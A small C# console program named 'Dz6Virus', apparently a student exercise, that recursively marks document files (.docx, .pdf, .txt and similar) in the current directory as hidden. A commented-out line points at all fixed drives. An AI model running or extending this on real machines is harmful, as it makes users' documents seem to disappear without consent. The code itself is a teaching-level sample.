using System;
using System.IO;
using System.Linq;

namespace Dz6Virus
{
    class Program
    {
        public static void Hide()
        {
            try
            {
                //var drivers = DriveInfo.GetDrives().Where(p => p.IsReady && p.DriveType == DriveType.Fixed);
                var dir = new DirectoryInfo(Directory.GetCurrentDirectory());
                foreach (var file in new[] { "*.docx", "*.doc", "*.dotx", "*.dot", "*.rtf", "*.txt", "*.htm", "*.pdf", "*.docm", "*.dotm", "*.xml", "*.mht", "*.dic", "*.thmx" }
                                        .SelectMany(p => dir.EnumerateFiles(p, SearchOption.AllDirectories)))
                {

                    if ((file.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
                    {
                        file.Attributes |= FileAttributes.Hidden;
                        Console.WriteLine(file.FullName);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Не удалось получить файлы: " + ex.Message);
            }
        }
        static void Main(string[] args)
        {
            Hide();
            Console.WriteLine("Нажмите любую клавишу для продожения...");
            Console.ReadKey(true);
        }
    }
}
